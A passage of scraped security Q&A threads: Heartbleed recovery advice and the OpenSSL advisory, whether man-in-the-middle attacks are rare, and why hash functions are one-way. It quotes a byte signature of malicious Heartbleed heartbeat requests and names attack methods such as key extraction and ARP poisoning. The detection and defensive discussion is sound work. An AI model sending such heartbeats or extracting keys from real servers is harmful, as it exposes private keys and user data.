Patching affected systems to OpenSSL 1.0.1g
Revocation of the old keypairs that were just supersceded
Changing all passwords
Invalidating all session keys and cookies
Evaluating the actual content handled by the vulnerable servers that could have been leaked, and reacting accordingly.
Evaluating any other information that could have been revealed, like memory addresses and security measures


Neel Mehta (the Google Security engineer who first reported the bug) has tweeted:


  Heap allocation patterns make private key exposure unlikely for #heartbleed #dontpanic.


Tomas Rzepka (probably from Swedish security firm Certezza) replied with what they had to do to recover keys:


  We can extract the private key successfully on FreeBSD after
  restarting apache and making the first request with ssltest.py


Private key theft has been also demonstrated by CloudFlare Challenge.

And Twitter user makomk chimed in with:


  I've recovered it from Apache on Gentoo as a bare prime factor in
  binary, but your demo's a lot clearer...It has a lowish success rate,
  more tries on the same connection don't help, reconnecting may,
  restarting probably won't...Someone with decent heap exploitation
  skills could probably improve the reliability. I'm not really trying
  that hard.




I summarized the bullet points above from heartbleed.com (emphasis mine):


  What is leaked primary key material and how to recover?
  
  These are the crown jewels, the encryption keys themselves. Leaked
  secret keys allows the attacker to decrypt any past and future traffic
  to the protected services and to impersonate the service at will. Any
  protection given by the encryption and the signatures in the X.509
  certificates can be bypassed. Recovery from this leak requires
  patching the vulnerability, revocation of the compromised keys and
  reissuing and redistributing new keys. Even doing all this will still
  leave any traffic intercepted by the attacker in the past still
  vulnerable to decryption. All this has to be done by the owners of the
  services.
  
  What is leaked secondary key material and how to recover?
  
  These are for example the user credentials (user names and
  passwords) used in the vulnerable services. Recovery from this leaks
  requires owners of the service first to restore trust to the service
  according to steps described above. After this users can start
  changing their passwords and possible encryption keys according to the
  instructions from the owners of the services that have been
  compromised. All session keys and session cookies should be invalided
  and considered compromised.
  
  What is leaked protected content and how to recover?
  
  This is the actual content handled by the vulnerable services. It
  may be personal or financial details, private communication such as
  emails or instant messages, documents or anything seen worth
  protecting by encryption. Only owners of the services will be able to
  estimate the likelihood what has been leaked and they should notify
  their users accordingly. Most important thing is to restore trust to
  the primary and secondary key material as described above. Only this
  enables safe use of the compromised services in the future.
  
  What is leaked collateral and how to recover?
  
  Leaked collateral are other details that have been exposed to the
  attacker in the leaked memory content. These may contain technical
  details such as memory addresses and security measures such as
  canaries used to protect against overflow attacks. These have only
  contemporary value and will lose their value to the attacker when
  OpenSSL has been upgraded to a fixed version.
AnswerKenntnis:
Directly copied from OpenSSL site

OpenSSL Security Advisory [07 Apr 2014]

TLS heartbeat read overrun (CVE-2014-0160)

A missing bounds check in the handling of the TLS heartbeat extension can be
used to reveal up to 64k of memory to a connected client or server.

Only 1.0.1 and 1.0.2-beta releases of OpenSSL are affected including
1.0.1f and 1.0.2-beta1.

Thanks for Neel Mehta of Google Security for discovering this bug and to
Adam Langley  and Bodo Moeller  for
preparing the fix.

Affected users should upgrade to OpenSSL 1.0.1g. Users unable to immediately
upgrade can alternatively recompile OpenSSL with -DOPENSSL_NO_HEARTBEATS.

1.0.2 will be fixed in 1.0.2-beta2.




Check if you're using the mentioned versions of OpenSSL, if yes patch it to 1.0.1g (by compiling it from source and wrapping the package with e.g. FPM).
(Addition by atk) Afterwards, replace your exposed certificates and revoke them.
(Addition by dr.jimbob) It's worth pointing out that OpenSSH is not affected by the OpenSSL bug. While OpenSSH does use openssl for some key-generation functions, it does not use the TLS protocol (and in particular the TLS heartbeat extension that heartbleed attacks). So there is no need to worry about SSH being compromised, though it is still a good idea to update openssl to 1.0.1g or 1.0.2-beta2 (but you don't have to worry about replacing SSH keypairs).


(OrangeDog): @drjimbob unless your SSH keys are in the memory of a process that's using OpenSSL's TLS. Unlikely but possible.

(Addition by Deer Hunter): Judging by the active attempts being reported in the DMZ, the best thing now is STOPPING THE FRIKKIN SERVER ASAP. Sessions are being hijacked, passwords leaked, confidential business data revealed.
(An extra bit courtesy of EFF.org): "To reach a firmer conclusion about Heartbleed's history, it would be best for the networking community to try to replicate Koeman's findings. Any network operators who have extensive TLS-layer traffic logs can check for malicious heartbeats, which most commonly have a TCP payload of 18 03 02 00 03 01 40 00 or 18 03 01 00 03 01 40 00, although the 0x4000 at the end may be replaced with lower numbers, particularly in implementations that try to read multiple malloc chunk bins." In a nutshell, if you keep detailed TLS logs (not likely for the majority of operators out there), check for past exploitation attempts (and share what you've got).




Related Q&A over at ServerFault:

https://serverfault.com/questions/587338/does-heartbleed-affect-aws-elastic-load-balancer

https://serverfault.com/questions/587329/heartbleed-what-is-it-and-what-are-options-to-mitigate-it

https://serverfault.com/questions/587348/best-method-to-update-ubuntu-13-10-to-path-the-heartbleed-bug

https://serverfault.com/questions/587324/heartbleed-how-to-reliably-and-portably-check-the-openssl-version

A well-written summary over at AskUbuntu: http://askubuntu.com/a/444905

A comprehensive Q&A at Unix&Linux SE: http://unix.stackexchange.com/questions/123711/how-do-i-recover-from-the-heartbleed-bug-in-openssl

If by any chance you run a server on Mac OS X: http://apple.stackexchange.com/questions/126916/what-versions-of-os-x-are-affected-by-heartbleed

Retrieving Private SSL Key using heart bleed: http://blog.cloudflare.com/answering-the-critical-question-can-you-get-private-ssl-keys-using-heartbleed 
Yes, it's possible!
AnswerKenntnis:
[edited]

I made a tool to check the status of your SSL and see if heartbeat is enabled and vulnerable. 
Tool at: http://rehmann.co/projects/heartbeat/

There's another one at http://filippo.io/Heartbleed/

If you're vulnerable, please upgrade your OpenSSL packages & renew your certs!
AnswerKenntnis:
Note that if you're using a cloud based provider or content distribution network, and they are vulnerable, your website's leaking content will be mixed with content of all other websites using this provider. I've just just seen that with Incapsula, where a bank website's content was leaked along cryptocurrency website. They're fixed now fortunately.
AnswerKenntnis:
Jspenguin wrote an offline tool to check if a server has the flaw. Download it, audit it, and run it.

I also wrote ssl-heartbleed-check.pl  (also an offline tool) to check if the OpenSSL used by your Perl stack (which on *n*x is often the openssl used by the whole system) is affected. This can help you to determine if you are affected on the client side.

Nmap 6.45 includes an ssl-heartbleed script. ssl-heartbleed.nse can also be used together with nmap ΓëÑ6.25.
QuestionKenntnis:
Are "man in the middle" attacks extremely rare?
qn_description:
In 

http://cdixon.org/2012/02/12/the-iphone-contact-list-controversy-and-app-security/

Chris Dixon makes a statement about web security


  Many commentators have suggested that a primary security risk is the fact that the data is transmitted in plain text. Encrypting over the wire is always a good idea but in reality ΓÇ£man-in-the-middleΓÇ¥ attacks are extremely rare. I would worry primarily about the far more common cases of 1) someone (insider or outsider) stealing in the companyΓÇÖs database, 2) a government subpoena for the companyΓÇÖs database. The best protection against these risks is encrypting the data in such a way that hackers and the company itself canΓÇÖt unencrypt it (or to not send the data to the servers in the first place).


I am wondering if there is any cold, hard, real world data to back up that assertion -- are "man in the middle" attacks actually rare in the real world, based on gathered data from actual intrusions or security incidents?
AnswersKenntnis
AnswerKenntnis:
My favorite current resource for cold, hard, real world data is the Verizon 2011 Data Breach Investigations Report. An excerpt from page 69 of the report:


  Actions
  
  The top three threat action categories were
  Hacking, Malware, and Social. The most common
  types of hacking actions used were the use of
  stolen login credentials, exploiting backdoors,
  and man-in-the-middle attacks.


From reading that, I infer that it's a secondary action used once somebody has a foothold in the system, but the Dutch High Tech Crime Unit's data says it's quite credible for concern. Of the 32 data breaches that made up their statistics, 15 involved MITM actions.

Definitely don't stop there, though. That entire report is a gold mine of reading and the best piece of work that I've come across for demonstrating where threats are really at.

For fuzzier references to MiTM attacks and methods, see also this excellent answer to MITM attacks - how likely are they? on Serverfault.

I would go further in saying that any instance of a SSL root coughing up a bad cert is a sign of an attack, otherwise they'd be pretty useless compromises. Finally, because I'm that guy, I would definitely try to splice into your network box outside the building if I were doing your pentest. One can do amazing things with a software radio even on a wired connection.
AnswerKenntnis:
The simple answer is no - there is a wide variety of evidence that this type of attack is common.

Some of the controls brought in by banks (two factor authentication etc) were in part required to combat the ever more common MITM attacks on customers.

While there are other forms of attack (compromise of client is a good one) which may now be easier to carry out through the use of malware to place a trojan on the client PC, MITM is still relatively easy in most cases.

The core fact to remember is that criminals tend to work on a good return on investment. The ROI for an attacker is very good:


low risk of being caught
low physical risk
some effort in coding the exploit can lead to real world monetary gain
the code can then be reused or sold to other criminals


As @CanBerk said, we aren't ever going to get any 'completely secure' protocols, but making life harder for criminals is a partial solution. MITM will not go away until it is made too difficult to be profitable.
AnswerKenntnis:
The recent compromise of certificate authority DigiNotar resulted in the issuance of over 500 fake certificates for google.com, microsoft.com, cia.gov, and hundreds of other sites.  These certificates somehow made their way into 40 different Iranian ISPs, resulting in a massive man-in-the-middle attack, confirmed to have affected over 300,000 Iranian users over the course of several months.

The hacker(s) responsible - confirmed to be the same one(s) responsible for the prior attack on the CA Comodo - claims to have full access to five other CA's, though he (they) only named one of them.

So yes, Man-in-the-middle attacks are a very real threat, even today.



Note: To prevent these sort of attacks from happening to you, consider using a program/addon to track certificates for suspicious changes, like Certificate Patrol, or try one of the fancy new replacements for the certificate-authority model that everyone is talking about.
AnswerKenntnis:
This answer is mostly about Chris Dixon's statement more than answering "How many attacks are coming from MiTM". 

If we assert the different way one could possibly become MiTM and the given consequences I think we can make up some conclusions of whether or not we care how prevalent MiTM attacks is. 

If we look at some risks for the different situations we could have something like: 


Someone stealing the database via exploiting the web application itself?
Someone attacking user/admin via MiTM attack


I would say the first has a much bigger impact (generally) and should in many ways be mitigated the most and treated the first.

So for point 2 to prevail over point 1 I think that MiTM would really have to be crazy wild for us to value it as high as a security obstacle as point 1 (As Chris denotes in the quote)! 

Now if we see at the different attack vectors. First for MiTM. To become MiTM one could for example:


Own a rogue wireless access point. This is trivial, but for a targeted attack you would have to be in the same physical location of the victim using your webapp.
Sniff unencrypted wireless data or data coming through a HUB (they even exist anymore?)
Use ARP Poisoning to attack the users. Not trivial unless you are on the same network as the targeted users using your webapp.
DNS Cache Poisoning. For this to work you need to poison the DNS being used by the targeted users. If the DNS is not properly set-up this attack becomes somewhat trivial to perform, however there is a lot to rely on for this to work. 
Phishing attacks. These still fool the unsuspecting and naive users, however a lot of the responsibility lies on the user. 


All this for just attack one or a small subset of users. Even then, attacking these users will give them a warning in their browsers (there is ways to attack this as well, but I am not taking that up here). Only by compromising a root CA or by finding a flaw in the algorithm used to generate the certificates would you be allowed to pose as a trusted certificate issuer.

If we on the other hand look at all the potential nasty stuff that we can see if we don't invest in enough security of the webapp itself we see attack vectors like:


SQL Injection - trivial and easy to both exploit and discover. Very high damage impact.
XSS (Cross Site Scripting) - easy to discover, harder to exploit. I think we will see higher and higher user impact from this in the future. I foresee this is becoming the "new SQL Injection" trend that we have been seeing back in the days.
CSRF (Cross Site Request Forgery) - Moderate to discover, moderate to exploit. This would require users navigating to an already owned site, triggering a request to your webapp which would do a transaction on the behalf of the user. 


So by just mentioning these few, but popular methods for both attacking webapp and becoming MiTM I would leave it up to a specific risk/consequence analysis of the specific given organization you are trying to secure, whether or not you should defend your users directly by implementing SSL or by defending the webapp as a whole (which also include intellectual property, user data, sensitive data, potential data that could breach other applications, and so on). 

So in my humble opinion I very much agree with Chris Dixon's statement. Prioritize securing the webapp as much as you can before you start thinking of securing the transport layer. 

Edit:
On a side note: Pages like Facebook, Gmail and others were under heavy MiTM attacks during the wake of Firesheep. This could only be mitigated through SSL and awareness. 

However if you think about it, sniffing wireless traffic with Firesheep and hijacking the sessions would require the wireless LAN you are connected to to not have any encryption. 

When I go war-driving today it has dramatically decreased the number of open wireless AP's and also in the number of WEP enabled AP's. We keep seeing more and more WPA2 encrypted AP's which in most cases provide us with enough security. 

Now what is the risk of someone creating a easy and convenient tool for sniffing and hijacking your users sessions? What is the impact for those users? It also could be mitigated in different ways (re-authenticating the user when coming from different footprints at the same time, notifying the user when something looks wrong (gmail is a good example of this)).
AnswerKenntnis:
It did not find any static or white paper that includes the real world data you wanted to have. 

However, I would like to add that MitM attacks within companies happens daily and more than once. Several security vendors have solutions to scan encrypted traffic (for example, Palo Alto Networks) and at least the company I currently work for has activated this feature. 

To do this, the firewall/proxy device is simply granted a certificate from internal Certificate Authority (CA) which is already trusted by all clients. When an application asks for a secure connection, the firewall/proxy device generates a new certificate for the target server on the fly and sent it to the client. Since the client trusts the internal CA, it also trusts the device certificate and will happily start a "secure" connection.
AnswerKenntnis:
I agree with daramarak that it'd be quite hard to find real world data on MitM attacks. One reason for that is, MitM attacks are by nature usually targeted at individuals, whereas attacks like DDoS or SQL injection are usually targeted at companies, organizations, etc.

Therefore, while we see a DDoS/injection/whatever report almost every day, information regarding MitM attacks are usually academic (e.g. "Twitter was DDoS'd!" vs. "SSL is vulnerable to MitM")

However, it should be noted that "rare" does not necessarily mean "hard." Most MitM attacks are arguably much easier to pull than most other types of attacks, and many protocols we use everyday are vulnerable to such attacks in one way or another, simply because it's quite hard to devise a protocol that's completely secure against MitM. This is in fact the case for most security problems, most solutions are "best effort" as opposed to "completely and absolutely secure."

Therefore, I think the main reason that MitM attacks are less common is that usually there's no need/incentive to perform one.
AnswerKenntnis:
I'm pretty sure sniffing passwords on wireless networks is extremely commonplace. Just look at how many tutorials there are for it on the web from a simple Google Search or Bing search.
AnswerKenntnis:
Well I guess if they were rare, nobody would compromise a CA, however we've seen a number of attempts and a few successes at this (suspects including Iran).

So I presume it has and will be done.  Otherwise why would they bother compromising a CA.  That's not the easiest task in the world.  Why not directly attack your target?

That said, they may be rare.  Anyone who compromises a CA is likely good enough to cover enough of their tracks so that we don't know the extent of their work.  Truthfully I wouldn't put it past the US Government to have done the same thing domestically as well as overseas.  I'd actually be surprised if they haven't.  Supporting this is I can't recall ever reading that HTTPS got in the US Governments way.  I do hear it periodically regarding Skype encryption, TrueCrypt or PGP disk encryption.
QuestionKenntnis:
Why are hash functions one way? If I know the algorithm, why can't I calculate the input from it?
qn_description:
Why can't a password hash be reverse engineered?

I've looked into this ages ago and have read lots on it, but I can't find the explanation of why it can't be done. An example will make it easier to understand my question and to keep things simple we will base it on a hashing algorithm that doesn't use a salt (LanMan).

Say my password is "Password". LanMan will hash this and store it in the database. Cracking programs can brute force these by hashing password guesses that you provide. It then compares the generated hash to the hash in the database. If there is a match, it works out the password.

Why, if the password cracker knows the algorithm to turn a plain text password into a hash, can't it just reverse the process to calculate the password from the hash?


  This question was IT Security Question of the Week.
  Read the Feb 24, 2012 blog entry for more details or submit your own Question of the Week.
AnswersKenntnis
AnswerKenntnis:
Let me invent a simple "password hashing algorithm" to show you how it works.  Unlike the other examples in this thread, this one is actually viable, if you can live with a few bizarre password restrictions.  Your password is two large prime numbers, x and y.  For example:

x = 48112959837082048697
y = 54673257461630679457


You can easily write a computer program to calculate xy in O(N^2) time, where N is the number of digits in x and y.  (Basically that means that it takes four times as long if the numbers are twice as long.  There are faster algorithms, but that's irrelevant.)  Store xy in the password database.

x*y = 2630492240413883318777134293253671517529


A child in fifth grade, given enough scratch paper, could figure out that answer.  But how do you reverse it?  There are many algorithms people have devised for factoring large numbers, but even the best algorithms are slow compared to how quickly you can multiply x by y.  And none of those algorithms could be performed by a fifth grader, unless the numbers were very small (e.g., x=3, y=5).

That is the key property: the computation is much simpler going forwards than backwards.  For many problems, you must invent a completely new algorithm to reverse a computation.

This has nothing to do with injective or bijective functions.  When you are cracking a password, it often doesn't matter if you get the same password or if you get a different password with the same hash.  The hash function is designed so it is hard to reverse it and get any answer at all, even a different password with the same hash.  In crypto-speak: a hash function vulnerable to a preimage attack is utterly worthless.  (The password hashing algorithm above is injective if you have a rule that x < y.)

What do cryptography experts do? Sometimes, they try to figure out new algorithms to reverse a hash function (pre-image).  They do exactly what you say: analyze the algorithm and try to reverse it.  Some algorithms have been reversed before, others have not.

Exercise for the reader: Suppose the password database contains the following entry:

3521851118865011044136429217528930691441965435121409905222808922963363310303627


What is the password?  (This one is actually not too difficult for a computer.)

Footnote: Due to the small number of passwords that people choose in practice, a good password hash is not merely difficult to compute backwards but also time-consuming to compute forwards, to slow down dictionary attacks.  As another layer of protection, randomized salt prevents the use of precomputed attack tables (such as "rainbow tables").

Footnote 2: How do we know that it is hard to reverse a hash function?  Unfortunately, we don't.  We just don't know any easy ways to reverse hash functions.  Making a hash function that is provably difficult to reverse is the holy grail of hash function design, and it has not been achieved yet (perhaps it will never happen).
AnswerKenntnis:
Now THAT is a good question.

We must first give a precision: many one-way functions, in particular hash function as commonly used in cryptography, accept inputs from a space which is much larger than the space of output values. For instance, SHA-256 is defined for inputs which are strings of up to 18446744073709551615 bits; there are 218446744073709551616-1 possible inputs, but since the output is always a sequence of 256 bits, there are only 2256 possible outputs for SHA-256. Necessarily, some distinct inputs yield the same output. Therefore, for a given output of SHA-256, it is not possible to unambiguously recover the input which was used, but, possibly, it might be possible to compute an input which yields the given output value. Preimage resistance is about that: the difficulty of finding a matching input for an output (regardless of how that output was obtained in the first place).

So we talk about a function that everybody can compute over any input (using a publicly known program, no secret value involved -- we are not talking about encryption).



What academics say

It is unclear whether one-way functions can actually exist. Right now, we have many functions that no one knows how to invert; but this does not mean that they are impossible to invert, in a mathematical sense. Note, though, that it is not proven that one-way functions cannot exist, so hope remains. Some people suspect that whether one-way functions may exist or not could be one of these irksome mathematical assertions which can be neither proven nor disproved (G├╢del's theorem proves that such things must exist). But there is no proof of that either.

Therefore, there is no proof that any given hash function is really resistant to preimages.

There are some functions which can be linked to well-known hard problems. For instance, if n is the product of two big primes, then the function x Γƒ╝ x2 mod n is hard to invert: being able to compute square roots modulo a non-prime integer n (on a general basis) is equivalent to being able to factor n, and that problem is known to be hard. Not proven to be hard, mind you; only that mathematicians have tried to efficiently factor big integers for (at least) the last 2500 years, and although some progress has been made, none of these smart people found a really killer algorithm for that. World record for factorization of a "RSA modulus" (a product of two randomly chosen big primes of similar lengths) is a 768-bit integer.

Some hash functions based on such "hard problems" have been proposed; see for instance MASH-1 and MASH-2 (on the RSA problem) and ECOH (with elliptic curves). Only a few such functions exist, because:


Turning a "hard problem" into a secure hash function is not easy; there are lots of tricky issues. For instance, while extracting square roots modulo a non-prime n is usually hard, there are values for which square root extraction is easy.
The performance of such hash functions tends to be, let's say, suboptimal. Like being 100x slower than a more commonly used SHA-1.


The more "standard" way of building a hash function is to get cryptographers together and have them gnaw at some proposed designs; the functions which survive cryptanalytic attempts for a few years are then considered "probably robust". The SHA-3 competition is such an effort; the winner should be announced later this year. On the 51 candidates (the ones who succeeded the administrative step), 14 were retained for "round 2" and these 14 have been relatively closely looked at by many cryptographers, and none of them found anything really worth saying about the functions. The list has been reduced to 5 and will be further reduced to 1 "soon", but not for security reasons (most of the actual data was about performance, not resistance).



What makes MD5 hard to invert

Since we do not know how to prove that a function is hard to invert, the best we can do is to give it a try on a specific function, so as to get an "intuition" of how the function achieves its apparent resistance.

I choose MD5, which is well known. Yes, MD5 is "broken", but that's for collisions, not preimages. There is a known preimage attack which is, at least theoretically, faster than the generic way (the "generic way" is "luck", i.e. trying inputs until a match is found, for an average cost of 2128 evaluations since MD5 has a 128-bit output; the Sasaki-Aoki attack has cost 2123.4, which is lower, but still way too high to be actually tried, so the result is still theoretical). But MD5 is relatively simple and has withstood attacks for quite some time, so it is an interesting example.

MD5 consists in a number of evaluations of a "compression function" over data blocks. The input message is first padded, so that its length becomes a multiple of 512 bits. It is then split into 512-bit blocks. A 128-bit running state (held in four 32-bit variables called A, B, C and D) is initialized to a conventional value, then processed with the compression function. The compression function takes the running state and one 512-bit message block, and mixes them into a new value for the running state. When all message blocks have been thus processed, the final value of the running state is the hash output.

So let's concentrate on the compression function. It works like this:


Inputs: the running state (A B C D) and a message block M. The message block is 512 bits; we split it into 16 32-bit words M0, M1, M2,... M15.
Output: the new running state value.
Processing:


Save the current state in some variables: A ΓåÆ A', B ΓåÆ B', C ΓåÆ C' and D ΓåÆ D'
Do 64 rounds which look like this:

Compute T = B + ((A + fi(B, C, D) + Mk + Xi) <<< si). This reads like this: we compute a given function fi (a simple bitwise function, which depends on the round number i) over B, C, and D. Add to that the value of A, one message word Mk and a constant Xi (additions are done modulo 232). Rotate the result to the left by some bits (the shift amount also depends on the round). Finally, add B: the result is T.
Rotate the state words: D ΓåÆ A, C ΓåÆ D, B ΓåÆ C, T ΓåÆ B.

Add the saved state values to the current state variables: A + A' ΓåÆ A, B + B' ΓåÆ B, C + C' ΓåÆ C, D + D' ΓåÆ D.



The important point is that there are 64 rounds, but only 16 message words. This means that each message word enters the processing four times. I write that in bold because it is the central point; resistance to preimages comes from that characteristic. Which message word is used in each round is described in the MD5 specification (RFC 1321); the specification also describes the functions fi, the rotate counts si and the 32-bit constants Xi.

Now suppose that you are trying to "invert" MD5; you begin from the output and work slowly up the compression function. First, you must decide the output of round 64. Indeed, the output of the compression function is the sum of the output of round 64, and the saved state (the A' B' C' D' values). You have neither, so you must choose. Your hope is that you will be able to find values for the message words which will allow you to obtain for input of round 1 some values which are coherent with your arbitrary decision on A' and its brothers.

Let's see how things look when you walk the compression function backward. You have the output of a round (the variables A, B, C and D after the round) and you want to recompute the input of that round. You already know the previous values of B, C and D, but for A and Mk you have plenty of choice: each 32-bit value is possible for A, and each has a corresponding Mk. At first, you are glad of that; who would spurn such freedom ? Just choose a random Mk, and this yields the corresponding A with just a few operations (try it !).

But after you have inverted that way 16 rounds (the rounds 49 to 64, since you are working backwards), freedom disappears. You have "chosen" the values of all the message words. When trying to invert round 48, you want to recompute the value of A just before that round; as per the MD5 specification, message word M2 is used in round 48, and you have already chosen the value of M2 (when inverting round 63). So there is only one choice for A. So what, would you say. One choice is sufficient to continue the backward walk. So you continue.

Now, you are at the beginning of the compression function. Remember that, initially, you made an arbitrary choice of the values of A' B' C' D': this allowed you to compute the output of round 64, and begin the backward walk. Now you have obtained the input of round 1, which should be identical to A' B' C' D'... and it does not match. That's quite normal: you chose A' B' C' D' arbitrarily, and you also chose the message words Mk arbitrarily, so it can be expected that it won't work most of the time. So you try to repair the computation, by retrospectively altering either your initial choice of A' B' C' D', or one or several of the random choices for Mk. But each modification on any Mk implies modifications elsewhere, because each Mk is used four times. So you need other modifications to cancel out the other ones, and so on...

At that point you begin to understand the problem of inverting MD5: every time you touch a single bit, it triggers an awful lot of modifications throughout the algorithm, which you need to cancel out by touching other bits, and there are just too many interactions. Basically, you juggle with 2128 balls at the same time, and that's way too much to keep track of all of them.

If each message block was 2048-bit long, split into 64 words, and each message word was used only once in MD5, then you could invert it easily. You do as above: arbitrary selection of A' B' C' D', arbitrary selection of message words for rounds 64 to 5; and for the first four rounds, you just consider the value you wish to obtain for the round input (the value which matches your arbitrary choice of A', B', C' or D') and work out the corresponding message word. Easy as pie. But MD5 does not process data by 2048-bit blocks, but by 512-bit blocks, and each message word is used four times.



Some additional twists

The structure of the compression function of MD5 is actually a generalization of a Feistel cipher. In a Feistel cipher, the data is split into two halves, and, for each round, we alter one half by adding/xoring it to an intermediate value which is computed from the other half and from the key; and then we swap the two halves. Extend this scheme to a four-parts split, and you get the same structure than the MD5 rounds -- with a 90┬║ rotate: MD5 looks like the encryption of the current state using the message block as key (and there is the extra addition of the output of round 64 with the saved state, which departs MD5 from a rotated cipher).

So maybe we can build hash functions out of block ciphers ? Indeed we can: that's what Whirlpool is about. A hash function built over a rotated block cipher (the message block is the key); the block cipher of Whirlpool is "W", a derivative of Rijndael, better known as the AES. But W has bigger blocks (512 bits instead of 128 bits) and a reforged key schedule.

When you make a hash function out of a rotated block cipher, then preimage attacks on the hash function are somewhat equivalent to key reconstruction attacks on the block cipher; so there is some hope that if the block cipher is secure, then so is the hash function. There again, there are snarky details. Also, for such a structure, collisions on the hash function are like related-key attacks on the block cipher; related-key attacks are usually considered non fatal, and often ignored (for instance, they were not part of the evaluation criteria for the AES competition, and Rijndael is reputed a bit flaky in that respect, which is why W has a brand new key schedule).

Some newer designs are built over a block cipher which is not rotated, so that security of the hash function can be derived more directly from security of the block cipher; see for instance the SHA-3 candidate Skein, defined over a block cipher called Threefish.

Conversely, one could try to make a block cipher out of a hash function. See for instance SHACAL, which is SHA-1 "set upright". And, on cue, SHACAL has some related-key weaknesses which are quite similar to the known weaknesses of SHA-1 with regards to collisions (no actual collision was computed, but we have a method which should be almost a million times faster than the generic collision-finding algorithm).

Therefore, contrary to what I said in the introduction of this post, we have been talking encryption all along. There is still much to be discovered and studied about the links between hash functions and symmetric encryption.



TL;DR: there is no TL;DR for this message. Read it whole, or begone.
AnswerKenntnis:
The first step to to the answer here is seeing examples, like the nice one from @Dietrich, of functions that are much harder to run in one direction than the inverse, and have resisted many attempts to find a speed breakthrough.  But the problem is complex, so I'll try to flesh it out some more.

Lots of people seem to be falling into the trap (heh) of thinking that hash functions are actually somehow magical - that they really are absolute "one way functions" that mathematically can't be run backwards at all, just because they are called hashes.  This is not a healthy way to think about it in a security forum.  It is often wrong in practice.  And it is always wrong in theory, given the basic mathematical definition of a function as a mapping from a domain to an image.

All hashes can be reversed, in principle.  It may be messy and brutish (as in brute-force), it may take a impractically long time with today's hardware, and it may even hold up over the long haul, but mathematically it is simply a matter of time.  As @mucker noted, all the information is there to find the original password.  If we forget that, we forget the danger of clever heuristics for cherry-picking likely passwords, which make the news regularly.  Hashing is an engineering problem and the primary challenge is an efficiency one - how to make it expensive to find the password given the hash.  One of the principle results of that kind of thinking is the importance of making password hashes slow

And the science and mathematics of hashing is only slowly getting better.  There really aren't any proofs that any hashes really are hard.
@Dietrich's answer is a nice way of illustrating how ideal hash functions might be possible.  But just look at the real experts describing how we don't have proofs for any of the best crypto algorithms: What's the mathematical model behind the security claims of symmetric ciphers and digest algorithms?

The fact that LanMan was cited in the question is yet more evidence that we need to avoid idealizing hashes.  LanMan is anything but an ideal hash function, easily defeated by a combination of a bit of analysis and a bit of brute forcing.  For another popular example of a horrid hash function see MySQL OLD_PASSWORD cryptanalysis?.

So get yourself back out of the trap - falling into it needn't be a one-way trip.  Recognize that hashes are reversible, and keep that trusty security-mindset active as you look for the best way to reverse them.  That's often the best way to find ones that really are hard to reverse.  I'm not trying to cast aspersions on the best practices out there, like bcrypt or  PBKDF2 or scrypt.  But the evidence is clear that even good programmers get this stuff wrong all too often.
so be careful with how you use them and don't try to invent your own.
AnswerKenntnis:
Because that's how Cryptographic Hash Functions work, they are one-way (from plain to hash) mathematical functions. Algorithms are made and tested specifically to avoid that, and also avoid collisions (2 different plain texts generate the same hash).

You can read more on wikipedia, but the main point of the article is:


  The ideal cryptographic hash function has four main or significant properties:  
  
  
  it is easy (but not necessarily quick) to compute the hash value for any given message  
  it is infeasible to generate a message that has a given hash  
  it is infeasible to modify a message without changing the hash  
  it is infeasible to find two different messages with the same hash
  


Most of the attacks on hash functions are based on finding collisions (so 2 different plain texts will match the same hash) or pre-generating millions of hashes and comparing them until you find the plain that generated it.

Long history short: if a hash algorithm is reverse-engineerable  or can be attacked that way, it's not a good hash algorithm.

For passwords, investigating using BCrypt, this post has a great deal of info on it.
AnswerKenntnis:
There are algorithms that are inherently not reversible; they change an input A into an output B in such a way that even if you know the exact steps of the algorithm, you can't recover A from B.

A very simple example: convert each character in the password to its ASCII value and sum all the values. There is no way you can recover the original password from the result.
AnswerKenntnis:
Imagine a hash function that uses a single bit for the hash. So your hash can either be 0 or 1.

And let's say the hash function adds up every byte of data and if the data was even, the hash value is 0. If the data was odd, the hash is 1.

Do you see why you couldn't recover your data by reverse engineering that hash function?

It's the same for actual hash algorithms, only the formulas are significantly better than the function I just described.

Your difficulty may be that you are considering hash as far as their use for passwords. It's not obvious why you cannot recover a 8 character password from a 128 bit hash. But that hash function you use for passwords can also be used to calculate the hash of an entire terabyte of data, and the hash will still take only 128 bits of data. Obviously, you cannot reverse engineer that 128 bit hash and recover your terabyte of data.

Also, assuming you had every possibly permutation of a single terabyte of data, there would be a huge amount of different datas that generate the same hash. After all, if you have more than 2^127 different permutations of data, you become likely to encounter two different datas that have the same hash.
AnswerKenntnis:
There is one aspect of the problem that people are missing in the previous answers. That is the many-to-one nature of hash functions. Since (most) hash functions are fixed length output (e.g., 256 bit), technically there are infinitely many strings that all hash to the same value. 

For example, if you take all all 512 bit strings (of which there are 2^512). There are only 2^256 outputs of the hash function. Thus, for each output of the hash function, there are roughly 2^256 512 bit strings which hash to that value. I say roughly because we don't know if the hash function actually is a random function, it could have slight biases.

Thus, given a digest, there are many strings which hash to the same value. Therefore, if you define "reversing a hash function" as outputting the users password, how is your reversing function going to deal with the potentially infinite number of strings that result in the given digest?
AnswerKenntnis:
You're asking "why is it important that hash functions be one-way?"  It's a security property.

There are two kinds of "hash" (or "message digest" as they're called) in common use today.  One is a plain message digest, which you may be familiar with as a checksum algorithm, such as CRC32.  The algorithm is designed so that a single bit change in the input will yield a different digest value.  The primary purpose of this is to ensure that a message is not been corrupted by accident.  CRC32 checksums are present on every TCP/IP packet, and a mis-match results in retransmission to correct the error.

Message digests are often used in cryptography as part of "signing" a message.  The message is encrypted by the sender with his private key, and anyone can use the public key to validate that it was encrypted by only the sender.  But RSA public key cryptography can only encrypt messages smaller than the key size (256 bytes), which are much shorter than most useful messages. Message digest algorithms produce values smaller than RSA keys.  So by encrypting the digest instead of the message, RSA signatures can be used on any size message.

But an ordinary message digest is not secure against an attacker.  Consider a very simple checksum that just sums the values of the characters.  If you signed such a checksum, I could swap out any other message that yields the same checksum, and the signatures would match, fooling the victim.

Another common use for message digests is password protection during storage.  If you encrypt the passwords before storing them in the system, a system administrator who knows the key could decrypt them all.  (You may have noticed this problem recently when some web sites were hacked.)

To avoid these problems, a different kind of hash is needed, one that is "cryptographically secure."  A secure hash algorithm has two additional properties, collision resistance, and non-reversibility.  

Collision resistance means that I should not be able to find a message that produces the same digest.  That way I can't swap my evil message for your good message.

Non-reversibility property means that I can't turn a digest back into a plaintext so I can't decrypt the original message, like the user's password.  

Creating a digest is a very similar problem to encryption, in that you have to scramble the data in such a way that it leaks no information about the original data.  It's even harder, because the same math has to not give any clues about how to successfully create a collision.
AnswerKenntnis:
